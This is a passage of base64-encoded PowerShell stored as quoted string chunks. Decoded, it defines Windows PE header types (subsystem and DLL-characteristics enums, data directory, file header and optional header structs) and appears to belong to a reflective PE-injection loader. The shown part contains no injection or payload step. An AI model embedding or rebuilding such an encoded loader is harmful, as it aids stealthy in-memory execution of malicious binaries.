ZdIDEyKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfUk9NJywgW1VJbnQxNl0gMTMpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1hCT1gnLCBbVUludDE2XSAxNCkgfCBPdXQtTnVsbAoJCSRTdWJTeXN0ZW1UeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU3ViU3lzdGVtVHlwZSAtVmFsdWUgJFN1YlN5c3RlbVR5cGUKCgkJI0VudW0gRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZQoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ0RsbENoYXJhY3RlcmlzdGljc1R5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU18wJywgW1VJbnQxNl0gMHgwMDAxKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU18xJywgW1VJbnQxNl0gMHgwMDAyKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU18yJywgW1VJbnQxNl0gMHgwMDA0KSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU18zJywgW1VJbnQxNl0gMHgwMDA4KSB8IE91dC1OdWxsCgkJJFR5cGVC",
		"dWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTF9DSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFJywgW1VJbnQxNl0gMHgwMDQwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTF9DSEFSQUNURVJJU1RJQ1NfRk9SQ0VfSU5URUdSSVRZJywgW1VJbnQxNl0gMHgwMDgwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTF9DSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUJywgW1VJbnQxNl0gMHgwMTAwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19JU09MQVRJT04nLCBbVUludDE2XSAweDAyMDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX1NFSCcsIFtVSW50MTZdIDB4MDQwMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fQklORCcsIFtVSW50MTZdIDB4MDgwMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfNCcsIFtVSW50MTZdIDB4MTAwMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfV0RNX0RSSVZFUicsIFtVSW50MTZdIDB4MjAwMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfVEVSTUlOQUxfU0VSVkVSX0FXQVJFJywgW1VJbnQxNl0gMHg4MDAwKSB8IE91dC1OdWxsCgkJJERsbENoYXJhY3RlcmlzdGljc1R5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlIC1WYWx1ZSAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZQoKCQkjIyMjIyMjIyMjIyAgICBTVFJVQ1QgICAgIyMjIyMjIyMjIyMKCQkjU3RydWN0IElNQUdFX0RBVEFfRElSRUNUT1JZCgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBFeHBsaWNpdExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfREFUQV9ESVJFQ1RPUlknLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA4KQoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxBZGRyZXNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQpIHwgT3V0LU51bGwKCQkkSU1BR0VfREFUQV9ESVJFQ1RPUlkgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9EQVRBX0RJUkVDVE9SWSAtVmFsdWUgJElNQUdFX0RBVEFfRElSRUNUT1JZCgoJCSNTdHJ1Y3QgSU1BR0VfRklMRV9IRUFERVIKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0ZJTEVfSEVBREVSJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjApCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWNoaW5lJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlNlY3Rpb25zJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUaW1lRGF0ZVN0YW1wJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9TeW1ib2xUYWJsZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZTeW1ib2xzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZPcHRpb25hbEhlYWRlcicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX0ZJTEVfSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRklMRV9IRUFERVIgLVZhbHVlICRJTUFHRV9GSUxFX0hFQURFUgoKCQkjU3RydWN0IElNQUdFX09QVElPTkFMX0hFQURFUjY0CgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBFeHBsaWNpdExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyNDApCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFnaWMnLCAkTWFnaWNUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCgwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgzKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZVbmluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZkVudHJ5UG9pbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1hZ2VCYXNlJywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDI0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2VjdGlvbkFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVBbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnV2luMzJWZXJzaW9uVmFsdWUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbWFnZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg1NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYWRlcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGVja1N1bScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg2NCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1N1YnN5c3RlbScsICRTdWJTeXN0ZW1UeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg2OCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RsbENoYXJhY3RlcmlzdGljcycsICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg3MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrUmVzZXJ2ZScsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg3MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrQ29tbWl0JywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcFJlc2VydmUnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFwQ29tbWl0JywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDk2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZGVyRmxhZ3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTA0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZSdmFBbmRTaXplcycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxMDgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeHBvcnRUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTEyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1wb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc291cmNlVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyOCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4Y2VwdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDZXJ0aWZpY2F0ZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNDQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlUmVsb2NhdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNTIpIHwgT3V0LU51bGwKCQko",
		"JFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWJ1ZycsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTYwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQXJjaGl0ZWN0dXJlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdHbG9iYWxQdHInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE3NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RMU1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxODQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2FkQ29uZmlnVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE5MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0JvdW5kSW1wb3J0JywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJQVQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwOCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RlbGF5SW1wb3J0RGVzY3JpcHRvcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjE2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ0xSUnVudGltZUhlYWRlcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjI0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUmVzZXJ2ZWQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIzMikgfCBPdXQtTnVsbAoJCSRJTUFHRV9PUFRJT05BTF9IRUFERVI2NCA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX09QVElPTkFMX0hFQURFUjY0IC1WYWx1ZSAkSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQKCgkJI1N0cnVjdCBJTUFHRV9PUFRJT05BTF9IRUFERVIzMgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX09QVElPTkFMX0hFQURFUjMyJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjI0KQoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hZ2ljJywgJE1hZ2ljVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMykgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mVW5pbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZFbnRyeVBvaW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VPZkRhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJbWFnZUJhc2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTZWN0aW9uQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzNikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdXaW4zMlZlcnNpb25WYWx1ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg1MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkltYWdlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDU2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhZGVycycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg2MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoZWNrU3VtJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDY0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU3Vic3lzdGVtJywgJFN1YlN5c3RlbVR5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDY4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGxsQ2hhcmFjdGVyaXN0aWNzJywgJERsbENoYXJhY3RlcmlzdGljc1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDcwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mU3RhY2tSZXNlcnZlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDcyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mU3RhY2tDb21taXQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFwUmVzZXJ2ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBDb21taXQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2FkZXJGbGFncycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4OCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUnZhQW5kU2l6ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeHBvcnRUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOTYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJbXBvcnRUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTA0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUmVzb3VyY2VUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTEyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhjZXB0aW9uVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NlcnRpZmljYXRlVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyOCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxk